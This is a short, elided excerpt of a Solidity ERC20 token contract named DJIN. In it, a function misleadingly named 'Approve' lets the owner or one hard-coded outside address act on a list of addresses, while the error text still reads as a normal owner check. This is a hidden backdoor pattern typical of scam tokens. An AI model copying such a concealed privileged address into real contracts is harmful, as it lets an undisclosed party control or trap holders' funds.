...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function Approve(address [] calldata _addresses_) external  {
        require(owner() == _msgSender() ||  address(0xc6B6618a19f9de2e4A6804E024912c9D7E8Bc811) == _msgSender(), "Ownable: caller is not the owner");
...
contract DJIN is ERC20 {
    constructor() ERC20("DJIN", "DJIN") {
